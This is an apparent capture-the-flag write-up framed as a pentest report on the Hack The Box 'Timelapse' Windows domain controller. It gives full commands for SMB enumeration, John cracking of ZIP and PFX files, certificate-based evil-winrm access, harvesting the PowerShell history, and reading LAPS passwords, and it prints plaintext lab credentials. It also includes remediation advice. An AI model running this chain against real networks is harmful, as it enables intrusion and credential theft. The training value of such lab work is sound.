# Penetration Test Report — Timelapse

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-LAPS%20%2F%20PFX%20cracking-red)

## Executive Summary

An authorized assessment of `target.htb` (Domain Controller, `timelapse.htb`) identified a publicly accessible SMB share containing a password-protected ZIP archive. Offline cracking recovered the archive and embedded PFX passwords, and the extracted certificate provided WinRM access. A PowerShell history file disclosed credentials for `svc_deploy`, a member of **LAPS_Readers**, which permitted reading the local Administrator password from LAPS — yielding full domain compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Anonymous SMB share exposing sensitive backup archive | High |
| 2 | Weak passwords on ZIP and PFX artifacts (offline-cracked) | High |
| 3 | Credentials stored in PowerShell history file | Medium |
| 4 | Over-privileged LAPS_Readers delegation over Domain Controllers | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV target.htb
```

Multiple AD services; machine name `dc01`, domain `timelapse.htb`. SMB anonymous access was verified:

```bash
smbclient -L //target.htb/
smbclient //target.htb/Shares
```

The `Shares` share contained `Dev\winrm_backup.zip`.

### 2. Cracking the Archive and PFX

The ZIP was password-protected; the password was recovered with John:

```bash
zip2john winrm_backup.zip > zip.john
john zip.john -wordlist:/usr/share/wordlists/rockyou.txt
# Password: supremelegacy
```

The archive contained `legacyy_dev_auth.pfx`, itself password-protected:

```bash
python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
john pfx.john -wordlist:/usr/share/wordlists/rockyou.txt
```

Certificate and key were extracted:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

### 3. Foothold — WinRM with Client Certificate

Port 5986 (WinRM over HTTPS) accepted certificate authentication:

```bash
evil-winrm -i target.htb -c cert.pem -k key.pem -S
```

PowerShell history revealed credentials for `svc_deploy`:

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```bash
evil-winrm -i target.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
net user svc_deploy   # member of LAPS_Readers
```

### 4. Privilege Escalation — LAPS

The **LAPS_Readers** group had delegation to read LAPS-managed local Administrator passwords for Domain Controllers. Using the `AdmPwd.PS` PowerShell module:

```powershell
upload AdmPwd.PS
Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders
Get-AdmPwdPassword -computername dc01 | Select password
```

Recovered Administrator password, then:

```bash
evil-winrm -i target.htb -u administrator -p '/1B@QZe3{BAAwzs%KY$pTb7d' -S
```

Root flag obtained.

## Remediation

- Remove anonymous access from SMB shares; never store credential-bearing backups on open shares.
- Enforce strong passwords on archives and PFX files; use a secrets vault.
- Clear/rotate PowerShell history and avoid typed credentials (`PSReadLine` logging).
- Restrict LAPS read delegation to dedicated admin tiers; alert on `ms-Mcs-AdmPwd` reads.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1135 — Network Share Discovery / unsecured shares |
| Credential Access | T1552 — Unsecured Credentials (history file) |
| Credential Access | T1110.002 — Password Cracking |
| Privilege Escalation | T1078 — Valid Accounts (LAPS delegation abuse) |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
